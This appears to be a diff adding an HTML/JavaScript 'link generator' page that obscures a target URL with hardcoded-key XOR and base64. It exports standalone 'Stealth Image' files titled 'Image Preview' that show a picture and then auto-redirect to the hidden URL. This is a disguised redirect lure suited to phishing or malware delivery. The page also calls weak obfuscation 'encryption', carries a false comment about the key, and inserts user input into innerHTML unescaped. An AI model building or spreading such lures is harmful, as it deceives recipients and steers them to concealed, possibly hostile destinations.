@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Link Generator | Secure Download System</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --bg-2: #12121a;
+            --panel: rgba(18, 18, 26, 0.95);
+            --stroke: rgba(255, 255, 255, 0.08);
+            --text: #e5e7eb;
+            --muted: #6b7280;
+            --accent: #8b5cf6;
+            --accent-2: #06b6d4;
+            --success: #10b981;
+            --danger: #ef4444;
+            --gradient: linear-gradient(135deg, #8b5cf6 0%, #06b6d4 100%);
+            --glow: 0 0 40px rgba(139, 92, 246, 0.3);
+            --radius: 16px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background: var(--bg);
+            background-image: 
+                radial-gradient(circle at 20% 20%, rgba(139, 92, 246, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(6, 182, 212, 0.1) 0%, transparent 50%);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            padding: 40px 0 30px;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: var(--muted);
+            font-size: 0.9rem;
+        }
+
+        .card {
+            background: var(--panel);
+            border: 1px solid var(--stroke);
+            border-radius: var(--radius);
+            padding: 24px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+
+        .card-title {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--muted);
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .card-title::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: var(--accent);
+            border-radius: 50%;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 0.85rem;
+            color: var(--muted);
+            margin-bottom: 8px;
+        }
+
+        input[type="text"],
+        input[type="url"] {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--stroke);
+            border-radius: 10px;
+            padding: 14px 16px;
+            color: var(--text);
+            font-family: inherit;
+            font-size: 0.95rem;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
+        }
+
+        input::placeholder {
+            color: var(--muted);
+        }
+
+        .upload-zone {
+            border: 2px dashed var(--stroke);
+            border-radius: 12px;
+            padding: 30px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: rgba(0, 0, 0, 0.2);
+        }
+
+        .upload-zone:hover {
+            border-color: var(--accent);
+            background: rgba(139, 92, 246, 0.05);
+        }
+
+        .upload-zone.has-image {
+            border-color: var(--success);
+            background: rgba(16, 185, 129, 0.05);
+        }
+
+        .upload-icon {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .upload-text {
+            color: var(--muted);
+            font-size: 0.9rem;
+        }
+
+        .preview-img {
+            max-width: 100%;
+            max-height: 200px;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-family: inherit;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-primary {
+            background: var(--gradient);
+            color: white;
+            box-shadow: var(--glow);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 60px rgba(139, 92, 246, 0.4);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text);
+            border: 1px solid var(--stroke);
+            margin-top: 10px;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .output-section {
+            display: none;
+        }
+
+        .output-section.active {
+            display: block;
+        }
+
+        .output-box {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--stroke);
+            border-radius: 10px;
+            padding: 16px;
+            margin-bottom: 12px;
+        }
+
+        .output-label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--muted);
+            margin-bottom: 6px;
+        }
+
+        .output-value {
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-2);
+            word-break: break-all;
+            line-height: 1.5;
+        }
+
+        .copy-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(139, 92, 246, 0.2);
+            color: var(--accent);
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 8px;
+        }
+
+        .copy-btn:hover {
+            background: rgba(139, 92, 246, 0.3);
+        }
+
+        .success-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--success);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            margin-bottom: 16px;
+        }
+
+        .links-list {
+            margin-top: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .link-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--stroke);
+            border-radius: 10px;
+            margin-bottom: 8px;
+        }
+
+        .link-item-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .link-item-title {
+            font-size: 0.9rem;
+            font-weight: 500;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .link-item-url {
+            font-size: 0.75rem;
+            color: var(--muted);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .link-item-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        .icon-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: none;
+            color: var(--muted);
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 1rem;
+        }
+
+        .icon-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--text);
+        }
+
+        .icon-btn.delete:hover {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--danger);
+        }
+
+        .hidden-input {
+            display: none;
+        }
+
+        .status-msg {
+            text-align: center;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 0.85rem;
+            margin-bottom: 16px;
+        }
+
+        .status-msg.success {
+            background: rgba(16, 185, 129, 0.1);
+            color: var(--success);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+
+        .status-msg.error {
+            background: rgba(239, 68, 68, 0.1);
+            color: var(--danger);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">🔗 LinkCrypt</div>
+            <p class="subtitle">Secure encrypted download links</p>
+        </header>
+
+        <!-- Create Link Card -->
+        <div class="card">
+            <div class="card-title">Create New Link</div>
+            
+            <div class="form-group">
+                <label>Link Title</label>
+                <input type="text" id="link-title" placeholder="e.g., My Photo Album">
+            </div>
+
+            <div class="form-group">
+                <label>Target URL</label>
+                <input type="url" id="link-url" placeholder="https://example.com/file.zip">
+            </div>
+
+            <div class="form-group">
+                <label>Cover Image (Optional)</label>
+                <div class="upload-zone" id="upload-zone">
+                    <div class="upload-icon">📷</div>
+                    <div class="upload-text">Tap to upload image</div>
+                    <img class="preview-img hidden-input" id="preview-img">
+                </div>
+                <input type="file" id="image-input" class="hidden-input" accept="image/*">
+            </div>
+
+            <div id="status-message" class="status-msg" style="display: none;"></div>
+
+            <button class="btn btn-primary" id="generate-btn">Generate Encrypted Link</button>
+        </div>
+
+        <!-- Output Section -->
+        <div class="card output-section" id="output-section">
+            <div class="success-badge">✓ Link Generated Successfully</div>
+            
+            <div class="output-box">
+                <div class="output-label">Encrypted Download Link</div>
+                <div class="output-value" id="encrypted-link"></div>
+                <button class="copy-btn" onclick="copyLink()">📋 Copy Link</button>
+            </div>
+
+            <div class="output-box">
+                <div class="output-label">Direct HTML (For Embedding)</div>
+                <div class="output-value" id="embed-code"></div>
+                <button class="copy-btn" onclick="copyEmbed()">📋 Copy HTML</button>
+            </div>
+
+            <button class="btn btn-secondary" onclick="downloadHTML()">⬇️ Download as HTML File</button>
+        </div>
+
+        <!-- Saved Links -->
+        <div class="card">
+            <div class="card-title">Saved Links</div>
+            <div class="links-list" id="links-list">
+                <p style="color: var(--muted); text-align: center; padding: 20px; font-size: 0.85rem;">
+                    No links created yet
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Encryption key (base64 encoded for obfuscation)
+        const ENCRYPTION_KEY = 'L1nkCrypt_S3cur3_K3y_2024';
+
+        // Storage
+        const STORAGE_KEY = 'linkcrypt_saved_links';
+        let savedLinks = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+        let uploadedImage = null;
+
+        // Elements
+        const uploadZone = document.getElementById('upload-zone');
+        const imageInput = document.getElementById('image-input');
+        const previewImg = document.getElementById('preview-img');
+        const generateBtn = document.getElementById('generate-btn');
+        const outputSection = document.getElementById('output-section');
+        const statusMsg = document.getElementById('status-message');
+
+        // Initialize
+        renderSavedLinks();
+
+        // Upload zone handlers
+        uploadZone.addEventListener('click', () => imageInput.click());
+
+        imageInput.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    uploadedImage = e.target.result;
+                    previewImg.src = uploadedImage;
+                    previewImg.classList.remove('hidden-input');
+                    uploadZone.classList.add('has-image');
+                    uploadZone.querySelector('.upload-icon').textContent = '✅';
+                    uploadZone.querySelector('.upload-text').textContent = file.name;
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+
+        // Generate button
+        generateBtn.addEventListener('click', generateLink);
+
+        function generateLink() {
+            const title = document.getElementById('link-title').value.trim();
+            const url = document.getElementById('link-url').value.trim();
+
+            if (!title || !url) {
+                showStatus('Please fill in title and URL', 'error');
+                return;
+            }
+
+            if (!isValidURL(url)) {
+                showStatus('Please enter a valid URL', 'error');
+                return;
+            }
+
+            // Create link data object
+            const linkData = {
+                id: Date.now().toString(36),
+                title: title,
+                url: url,
+                image: uploadedImage || null,
+                created: new Date().toISOString()
+            };
+
+            // Encrypt the URL
+            const encryptedURL = encryptData(url);
+            const encryptedData = encryptData(JSON.stringify(linkData));
+
+            // Generate the final link (base64 encoded with prefix)
+            const finalLink = `${window.location.origin}/dl.html#${encryptedData}`;
+
+            // Display output
+            document.getElementById('encrypted-link').textContent = finalLink;
+            document.getElementById('embed-code').textContent = generateEmbedCode(linkData, encryptedData);
+            outputSection.classList.add('active');
+
+            // Save to storage
+            savedLinks.unshift(linkData);
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(savedLinks));
+            renderSavedLinks();
+
+            showStatus('Link generated successfully!', 'success');
+
+            // Reset form
+            document.getElementById('link-title').value = '';
+            document.getElementById('link-url').value = '';
+            resetUploadZone();
+        }
+
+        // Encryption functions (XOR + Base64)
+        function encryptData(data) {
+            let encrypted = '';
+            for (let i = 0; i < data.length; i++) {
+                encrypted += String.fromCharCode(
+                    data.charCodeAt(i) ^ ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length)
+                );
+            }
+            return btoa(unescape(encodeURIComponent(encrypted)));
+        }
+
+        function decryptData(encryptedData) {
+            try {
+                const decoded = decodeURIComponent(escape(atob(encryptedData)));
+                let decrypted = '';
+                for (let i = 0; i < decoded.length; i++) {
+                    decrypted += String.fromCharCode(
+                        decoded.charCodeAt(i) ^ ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length)
+                    );
+                }
+                return decrypted;
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function generateEmbedCode(linkData, encryptedData) {
+            return `<a href="${window.location.origin}/dl.html#${encryptedData}" target="_blank">${linkData.title}</a>`;
+        }
+
+        function isValidURL(string) {
+            try {
+                new URL(string);
+                return true;
+            } catch (_) {
+                return false;
+            }
+        }
+
+        function showStatus(msg, type) {
+            statusMsg.textContent = msg;
+            statusMsg.className = `status-msg ${type}`;
+            statusMsg.style.display = 'block';
+            setTimeout(() => {
+                statusMsg.style.display = 'none';
+            }, 3000);
+        }
+
+        function resetUploadZone() {
+            uploadedImage = null;
+            previewImg.classList.add('hidden-input');
+            uploadZone.classList.remove('has-image');
+            uploadZone.querySelector('.upload-icon').textContent = '📷';
+            uploadZone.querySelector('.upload-text').textContent = 'Tap to upload image';
+            imageInput.value = '';
+        }
+
+        function copyLink() {
+            const link = document.getElementById('encrypted-link').textContent;
+            navigator.clipboard.writeText(link).then(() => {
+                showStatus('Link copied to clipboard!', 'success');
+            });
+        }
+
+        function copyEmbed() {
+            const embed = document.getElementById('embed-code').textContent;
+            navigator.clipboard.writeText(embed).then(() => {
+                showStatus('HTML copied to clipboard!', 'success');
+            });
+        }
+
+        function downloadHTML() {
+            const lastLink = savedLinks[0];
+            if (!lastLink) return;
+
+            const encryptedData = encryptData(JSON.stringify(lastLink));
+            
+            const htmlContent = generateStandaloneHTML(lastLink, encryptedData);
+            
+            const blob = new Blob([htmlContent], { type: 'text/html' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${lastLink.title.replace(/[^a-z0-9]/gi, '_')}.html`;
+            a.click();
+            URL.revokeObjectURL(url);
+            
+            showStatus('HTML file downloaded!', 'success');
+        }
+
+        function generateStandaloneHTML(linkData, encryptedData) {
+            // This version is a 'Stealth Image' - it looks like an image but auto-executes the redirect
+            const base64Img = linkData.image || '';
+            
+            return `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Image Preview</title>
+    <style>
+        body, html { 
+            margin: 0; padding: 0; width: 100%; height: 100%; 
+            background: #000; overflow: hidden; 
+            display: flex; align-items: center; justify-content: center;
+        }
+        img { 
+            max-width: 100%; max-height: 100%; 
+            object-fit: contain; cursor: pointer;
+        }
+        #loader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 2px;
+            background: rgba(255,255,255,0.1); z-index: 100;
+        }
+        #progress {
+            width: 0%; height: 100%; background: #fff;
+            transition: width 0.5s linear;
+        }
+    </style>
+</head>
+<body>
+    <div id="loader"><div id="progress"></div></div>
+    ${base64Img ? `<img src="${base64Img}" id="target-img" alt="Loading asset...">` : '<div style="color:#333; font-family:sans-serif;">Loading Image...</div>'}
+
+    <script>
+        const KEY = '${ENCRYPTION_KEY}';
+        const DATA = '${encryptedData}';
+        
+        function decrypt(d) {
+            try {
+                const decoded = decodeURIComponent(escape(atob(d)));
+                let r = '';
+                for (let i = 0; i < decoded.length; i++) {
+                    r += String.fromCharCode(decoded.charCodeAt(i) ^ KEY.charCodeAt(i % KEY.length));
+                }
+                return JSON.parse(r);
+            } catch(e) { return null; }
+        }
+
+        const runAction = () => {
+            const data = decrypt(DATA);
+            if (data && data.url) {
+                window.location.replace(data.url);
+            }
+        };
+
+        // Automatic Execution
+        window.addEventListener('load', () => {
+            const prog = document.getElementById('progress');
+            if(prog) prog.style.width = '100%';
+            
+            // Short delay to show the image before redirecting
+            setTimeout(runAction, 1200);
+        });
+
+        // Backup for mobile (tap to run if auto-run is blocked)
+        document.body.addEventListener('click', runAction);
+    <\/script>
+</body>
+</html>`;
+        }
+
+        function renderSavedLinks() {
+            const container = document.getElementById('links-list');
+            
+            if (savedLinks.length === 0) {
+                container.innerHTML = `<p style="color: var(--muted); text-align: center; padding: 20px; font-size: 0.85rem;">
+                    No links created yet
+                </p>`;
+                return;
+            }
+
+            container.innerHTML = savedLinks.map((link, index) => `
+                <div class="link-item">
+                    <div class="link-item-info">
+                        <div class="link-item-title">${link.title}</div>
+                        <div class="link-item-url">${link.url}</div>
+                    </div>
+                    <div class="link-item-actions">
+                        <button class="icon-btn" onclick="copyLinkById(${index})" title="Copy">📋</button>
+                        <button class="icon-btn" onclick="downloadById(${index})" title="Download">⬇️</button>
+                        <button class="icon-btn delete" onclick="deleteLink(${index})" title="Delete">🗑️</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function copyLinkById(index) {
+            const link = savedLinks[index];
+            const encryptedData = encryptData(JSON.stringify(link));
+            const finalLink = `${window.location.origin}/dl.html#${encryptedData}`;
+            navigator.clipboard.writeText(finalLink).then(() => {
+                showStatus('Link copied!', 'success');
+            });
+        }
+
+        function downloadById(index) {
+            const link = savedLinks[index];
+            const encryptedData = encryptData(JSON.stringify(link));
+            const htmlContent = generateStandaloneHTML(link, encryptedData);
+            
+            const blob = new Blob([htmlContent], { type: 'text/html' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${link.title.replace(/[^a-z0-9]/gi, '_')}.html`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function deleteLink(index) {
+            if (confirm('Delete this link?')) {
+                savedLinks.splice(index, 1);
+                localStorage.setItem(STORAGE_KEY, JSON.stringify(savedLinks));
+                renderSavedLinks();
+                showStatus('Link deleted', 'success');
+            }
+        }
+    </script>
+</body>
+</html>
